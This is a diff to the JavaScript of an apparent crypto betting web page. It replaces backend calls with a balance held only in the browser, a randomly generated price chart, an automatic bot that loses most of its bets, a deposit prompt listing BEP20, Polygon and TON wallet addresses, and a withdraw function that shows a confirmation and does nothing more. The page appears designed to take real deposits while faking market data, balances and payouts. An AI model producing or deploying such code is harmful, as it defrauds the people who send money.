@@ -1,141 +1,60 @@
-const API_BASE = "https://betwin-winn.onrender.com";
-let currentUserId = null;
-let chart = null;
+// Balance System
+let balance = 100;
+const balanceEl = document.getElementById("balance");
+const logList = document.getElementById("logList");
 
-// ------------------ User ------------------
-async function createUser() {
-    const username = document.getElementById("username").value;
-    if (!username) return alert("Enter username");
+document.getElementById("addBalance").addEventListener("click", () => {
+  balance += 50;
+  updateBalance();
+});
 
-    try {
-        const res = await fetch(`${API_BASE}/users`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ username })
-        });
-        const data = await res.json();
-        if (data.error) return alert(data.error);
-
-        currentUserId = data._id;
-        document.getElementById("user-message").innerText = `User created: ${data.username}`;
-        document.getElementById("balance").innerText = data.balance;
-    } catch (err) {
-        console.error(err);
-    }
+function deposit() {
+  alert("Deposit your funds:\n\nBEP20: 0xE1D4b2BEC237AEDDB47da56b82b2f15812e45B44\nPolygon: 0xE1D4b2BEC237AEDDB47da56b82b2f15812e45B4\nTON: EQAj7vKLbaWjaNbAuAKP1e1HwmdYZ2vJ2xtWU8qq3JafkfxF");
+}
+function withdraw() {
+  alert("Withdrawal request submitted!");
 }
 
-async function fetchBalance() {
-    if (!currentUserId) return;
-    try {
-        const res = await fetch(`${API_BASE}/users/${currentUserId}`);
-        const data = await res.json();
-        document.getElementById("balance").innerText = data.balance;
-    } catch (err) {
-        console.error(err);
-    }
+function updateBalance() {
+  balanceEl.innerText = balance;
 }
 
-// ------------------ Bet ------------------
-async function placeBet() {
-    if (!currentUserId) return alert("Create a user first");
-    const amount = Number(document.getElementById("amount").value);
-    const type = document.getElementById("bet-type").value;
+// Graph
+const chart = LightweightCharts.createChart(document.getElementById("chart"), {
+  width: window.innerWidth,
+  height: 400,
+  layout: { background: { color: '#111' }, textColor: '#ddd' },
+  grid: { vertLines: { color: '#333' }, horzLines: { color: '#333' } }
+});
+const lineSeries = chart.addLineSeries({ color: '#4caf50' });
 
-    if (amount <= 0) return alert("Enter valid amount");
-
-    try {
-        const res = await fetch(`${API_BASE}/bets`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ userId: currentUserId, amount, type })
-        });
-        const data = await res.json();
-        if (data.error) return alert(data.error);
-
-        document.getElementById("bet-message").innerText = `Bet placed: ${type} ${amount}`;
-        fetchBalance();
-        fetchRecentBets();
-    } catch (err) {
-        console.error(err);
-    }
+let time = 0;
+let price = 100;
+function updateGraph() {
+  price += (Math.random() - 0.5) * 2;
+  lineSeries.update({ time, value: price });
+  time++;
 }
+setInterval(updateGraph, 1000);
 
-// ------------------ Recent Bets ------------------
-async function fetchRecentBets() {
-    try {
-        const res = await fetch(`${API_BASE}/bets/recent`);
-        const bets = await res.json();
-        const list = document.getElementById("results-list");
-        list.innerHTML = "";
-        bets.forEach(b => {
-            const li = document.createElement("li");
-            li.innerText = `${b.usernameRef}: ${b.type} ${b.amount} → ${b.status}`;
-            list.appendChild(li);
-        });
-    } catch (err) {
-        console.error(err);
-    }
+// Auto Bot (always running)
+function botAction() {
+  const bet = Math.random() > 0.5 ? "UP" : "DOWN";
+  const win = Math.random() < 0.3; // 30% win rate
+  if (win) {
+    balance += 10;
+    addLog(`Bot bet ${bet} → WON (+10)`, "win");
+  } else {
+    balance -= 10;
+    addLog(`Bot bet ${bet} → LOST (-10)`, "loss");
+  }
+  updateBalance();
 }
+setInterval(botAction, 4000); // every 4 sec bot bet karega
 
-// ------------------ Graph ------------------
-async function fetchGraph() {
-    try {
-        const res = await fetch(`${API_BASE}/graph`);
-        const data = await res.json();
-        renderGraph(data);
-    } catch (err) {
-        console.error(err);
-    }
+function addLog(message, type) {
+  const li = document.createElement("li");
+  li.textContent = message;
+  li.className = type;
+  logList.prepend(li);
 }
-
-function renderGraph(data) {
-    const ctx = document.getElementById("priceGraph").getContext("2d");
-    const labels = data.map(p => new Date(p.t).toLocaleTimeString());
-    const values = data.map(p => p.v);
-
-    if (chart) {
-        chart.data.labels = labels;
-        chart.data.datasets[0].data = values;
-        chart.update();
-    } else {
-        chart = new Chart(ctx, {
-            type: "line",
-            data: {
-                labels,
-                datasets: [{
-                    label: "Price",
-                    data: values,
-                    borderColor: "#ffcc00",
-                    backgroundColor: "rgba(255,204,0,0.2)",
-                    fill: true
-                }]
-            },
-            options: {
-                responsive: true,
-                scales: {
-                    x: { display: true },
-                    y: { display: true }
-                }
-            }
-        });
-    }
-}
-
-// ------------------ Countdown ------------------
-async function fetchRoundStatus() {
-    try {
-        const res = await fetch(`${API_BASE}/round/status`);
-        const round = await res.json();
-        if (!round) return;
-
-        document.getElementById("countdown").innerText = round.remaining;
-    } catch (err) {
-        console.error(err);
-    }
-}
-
-// ------------------ Auto Refresh ------------------
-setInterval(fetchGraph, 1000);
-setInterval(fetchRoundStatus, 500);
-setInterval(fetchRecentBets, 2000);
-setInterval(fetchBalance, 5000);
